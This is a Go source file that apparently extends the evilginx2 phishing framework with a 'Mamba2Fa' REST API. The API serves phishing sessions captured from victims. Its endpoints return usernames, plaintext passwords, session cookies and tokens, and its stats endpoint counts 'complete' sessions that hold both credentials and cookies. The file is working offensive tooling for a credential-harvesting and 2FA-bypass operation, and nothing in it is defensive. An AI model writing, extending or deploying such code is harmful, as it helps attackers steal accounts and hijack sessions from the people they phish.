package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type Mamba2FaAPI struct {
	router   *mux.Router
	config   *Config
	db       *database.Database
	crt_db   *CertDb
	sessions map[string]*Session
	apiKey   string
	port     int
	enabled  bool
	mtx      sync.Mutex
}

// API Response structures
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

type SessionResponse struct {
	ID          int                                         `json:"id"`
	SessionID   string                                      `json:"session_id"`
	Phishlet    string                                      `json:"phishlet"`
	Username    string                                      `json:"username"`
	Password    string                                      `json:"password"`
	RemoteAddr  string                                      `json:"remote_addr"`
	UserAgent   string                                      `json:"user_agent"`
	LandingURL  string                                      `json:"landing_url"`
	CookieCount int                                         `json:"cookie_count"`
	Tokens      map[string]string                           `json:"tokens,omitempty"`
	Cookies     map[string]map[string]*database.CookieToken `json:"cookies,omitempty"`
	Custom      map[string]string                           `json:"custom,omitempty"`
}

type PhishletResponse struct {
	Name      string `json:"name"`
	Enabled   bool   `json:"enabled"`
	Visible   bool   `json:"visible"`
	Hostname  string `json:"hostname"`
	UnauthURL string `json:"unauth_url"`
}

type LureResponse struct {
	ID         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	Hostname   string `json:"hostname"`
	Path       string `json:"path"`
	RedirectTo string `json:"redirect_to"`
	URL        string `json:"url"`
}

// NewMamba2FaAPI creates a new API instance
func NewMamba2FaAPI(config *Config, db *database.Database, crt_db *CertDb, apiKey string, port int) *Mamba2FaAPI {
	api := &Mamba2FaAPI{
		router:   mux.NewRouter(),
		config:   config,
		db:       db,
		crt_db:   crt_db,
		sessions: make(map[string]*Session),
		apiKey:   apiKey,
		port:     port,
		enabled:  false,
	}

	api.setupRoutes()
	return api
}

// Authentication middleware
func (api *Mamba2FaAPI) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			api.sendError(w, "Missing Authorization header", http.StatusUnauthorized)
			return
		}

		parts := strings.Split(authHeader, " ")
		if len(parts) != 2 || parts[0] != "Bearer" {
			api.sendError(w, "Invalid Authorization header format", http.StatusUnauthorized)
			return
		}

		if parts[1] != api.apiKey {
			api.sendError(w, "Invalid API key", http.StatusUnauthorized)
			return
		}

		next(w, r)
	}
}

// Setup API routes
func (api *Mamba2FaAPI) setupRoutes() {
	// Health check (no auth)
	api.router.HandleFunc("/api/health", api.handleHealth).Methods("GET")

	// Session endpoints
	api.router.HandleFunc("/api/sessions", api.authMiddleware(api.handleListSessions)).Methods("GET")
	api.router.HandleFunc("/api/sessions/{id}", api.authMiddleware(api.handleGetSession)).Methods("GET")
	api.router.HandleFunc("/api/sessions/{id}", api.authMiddleware(api.handleDeleteSession)).Methods("DELETE")
	api.router.HandleFunc("/api/sessions", api.authMiddleware(api.handleDeleteAllSessions)).Methods("DELETE")

	// Phishlet endpoints (commented out - need proper integration)
	// api.router.HandleFunc("/api/phishlets", api.authMiddleware(api.handleListPhishlets)).Methods("GET")
	// api.router.HandleFunc("/api/phishlets/{name}", api.authMiddleware(api.handleGetPhishlet)).Methods("GET")
	// api.router.HandleFunc("/api/phishlets/{name}/enable", api.authMiddleware(api.handleEnablePhishlet)).Methods("POST")
	// api.router.HandleFunc("/api/phishlets/{name}/disable", api.authMiddleware(api.handleDisablePhishlet)).Methods("POST")
	// api.router.HandleFunc("/api/phishlets/{name}/hostname", api.authMiddleware(api.handleSetHostname)).Methods("POST")

	// Lure endpoints (commented out - need proper integration)
	// api.router.HandleFunc("/api/lures", api.authMiddleware(api.handleListLures)).Methods("GET")
	// api.router.HandleFunc("/api/lures", api.authMiddleware(api.handleCreateLure)).Methods("POST")
	// api.router.HandleFunc("/api/lures/{id}", api.authMiddleware(api.handleGetLure)).Methods("GET")
	// api.router.HandleFunc("/api/lures/{id}", api.authMiddleware(api.handleDeleteLure)).Methods("DELETE")

	// Stats endpoint
	api.router.HandleFunc("/api/stats", api.authMiddleware(api.handleStats)).Methods("GET")
}

// Helper functions
func (api *Mamba2FaAPI) sendJSON(w http.ResponseWriter, data interface{}, status int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func (api *Mamba2FaAPI) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
	response := APIResponse{
		Success: true,
		Message: message,
		Data:    data,
	}
	api.sendJSON(w, response, http.StatusOK)
}

func (api *Mamba2FaAPI) sendError(w http.ResponseWriter, error string, status int) {
	response := APIResponse{
		Success: false,
		Error:   error,
	}
	api.sendJSON(w, response, status)
}

// API Handlers

// Health check
func (api *Mamba2FaAPI) handleHealth(w http.ResponseWriter, r *http.Request) {
	api.sendSuccess(w, "Mamba2Fa API is running", map[string]string{
		"version": "2.1",
		"status":  "healthy",
	})
}

// List all sessions
func (api *Mamba2FaAPI) handleListSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.sendError(w, fmt.Sprintf("Failed to list sessions: %v", err), http.StatusInternalServerError)
		return
	}

	sessionResponses := make([]SessionResponse, 0)
	for _, s := range sessions {
		sessionResponses = append(sessionResponses, SessionResponse{
			ID:          s.Id,
			SessionID:   s.SessionId,
			Phishlet:    s.Phishlet,
			Username:    s.Username,
			Password:    s.Password,
			RemoteAddr:  s.RemoteAddr,
			UserAgent:   s.UserAgent,
			LandingURL:  s.LandingURL,
			CookieCount: len(s.CookieTokens),
		})
	}

	api.sendSuccess(w, "Sessions retrieved successfully", sessionResponses)
}

// Get single session
func (api *Mamba2FaAPI) handleGetSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.sendError(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	sessions, err := api.db.ListSessions()
	if err != nil {
		api.sendError(w, fmt.Sprintf("Failed to get session: %v", err), http.StatusInternalServerError)
		return
	}

	for _, s := range sessions {
		if s.Id == id {
			response := SessionResponse{
				ID:          s.Id,
				SessionID:   s.SessionId,
				Phishlet:    s.Phishlet,
				Username:    s.Username,
				Password:    s.Password,
				RemoteAddr:  s.RemoteAddr,
				UserAgent:   s.UserAgent,
				LandingURL:  s.LandingURL,
				CookieCount: len(s.CookieTokens),
				Tokens:      s.BodyTokens,
				Cookies:     s.CookieTokens,
				Custom:      s.Custom,
			}
			api.sendSuccess(w, "Session retrieved successfully", response)
			return
		}
	}

	api.sendError(w, "Session not found", http.StatusNotFound)
}

// Delete session
func (api *Mamba2FaAPI) handleDeleteSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.sendError(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	err = api.db.DeleteSessionById(id)
	if err != nil {
		api.sendError(w, fmt.Sprintf("Failed to delete session: %v", err), http.StatusInternalServerError)
		return
	}

	api.sendSuccess(w, fmt.Sprintf("Session %d deleted successfully", id), nil)
}

// Delete all sessions
func (api *Mamba2FaAPI) handleDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.sendError(w, fmt.Sprintf("Failed to list sessions: %v", err), http.StatusInternalServerError)
		return
	}

	count := 0
	for _, s := range sessions {
		if err := api.db.DeleteSessionById(s.Id); err == nil {
			count++
		}
	}

	api.sendSuccess(w, fmt.Sprintf("Deleted %d sessions", count), map[string]int{"deleted": count})
}

// Phishlet and Lure handlers (commented out - need proper integration with phishlet manager)
// These can be re-enabled once we have proper access to the Phishlets type

/*
// List phishlets
func (api *Mamba2FaAPI) handleListPhishlets(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper phishlet manager
	api.sendSuccess(w, "Phishlets retrieved successfully", []PhishletResponse{})
}

// Get phishlet details
func (api *Mamba2FaAPI) handleGetPhishlet(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper phishlet manager
	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
}

// Enable phishlet
func (api *Mamba2FaAPI) handleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper phishlet manager
	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
}

// Disable phishlet
func (api *Mamba2FaAPI) handleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper phishlet manager
	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
}

// Set phishlet hostname
func (api *Mamba2FaAPI) handleSetHostname(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper phishlet manager
	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
}

// List lures
func (api *Mamba2FaAPI) handleListLures(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper lure manager
	api.sendSuccess(w, "Lures retrieved successfully", []LureResponse{})
}

// Create lure
func (api *Mamba2FaAPI) handleCreateLure(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper lure manager
	api.sendError(w, "Lure creation not yet implemented", http.StatusNotImplemented)
}

// Get lure
func (api *Mamba2FaAPI) handleGetLure(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper lure manager
	api.sendError(w, "Lure retrieval not yet implemented", http.StatusNotImplemented)
}

// Delete lure
func (api *Mamba2FaAPI) handleDeleteLure(w http.ResponseWriter, r *http.Request) {
	// TODO: Implement with proper lure manager
	api.sendError(w, "Lure deletion not yet implemented", http.StatusNotImplemented)
}
*/

// Get stats
func (api *Mamba2FaAPI) handleStats(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.sendError(w, fmt.Sprintf("Failed to get stats: %v", err), http.StatusInternalServerError)
		return
	}

	completeSessions := 0
	for _, s := range sessions {
		if s.Username != "" && s.Password != "" && len(s.CookieTokens) > 0 {
			completeSessions++
		}
	}

	stats := map[string]interface{}{
		"total_sessions":    len(sessions),
		"complete_sessions": completeSessions,
		"total_phishlets":   0, // TODO: Get from phishlet manager
		"enabled_phishlets": 0, // TODO: Get from phishlet manager
	}

	api.sendSuccess(w, "Stats retrieved successfully", stats)
}

// Start API server
func (api *Mamba2FaAPI) Start() error {
	api.mtx.Lock()
	defer api.mtx.Unlock()

	if api.enabled {
		return fmt.Errorf("API server already running")
	}

	addr := fmt.Sprintf(":%d", api.port)
	log.Important("🔌 Mamba2Fa API Server starting on %s", addr)
	log.Important("🔑 API Authentication: Bearer token required")
	log.Info("📡 API Endpoints available at http://localhost%s/api/", addr)

	go func() {
		if err := http.ListenAndServe(addr, api.router); err != nil {
			log.Error("API Server error: %v", err)
		}
	}()

	api.enabled = true
	log.Success("✅ Mamba2Fa API Server started successfully")
	return nil
}

// Stop API server
func (api *Mamba2FaAPI) Stop() {
	api.mtx.Lock()
	defer api.mtx.Unlock()
	api.enabled = false
	log.Info("API Server stopped")
}

// IsRunning checks if API server is running
func (api *Mamba2FaAPI) IsRunning() bool {
	api.mtx.Lock()
	defer api.mtx.Unlock()
	return api.enabled
}
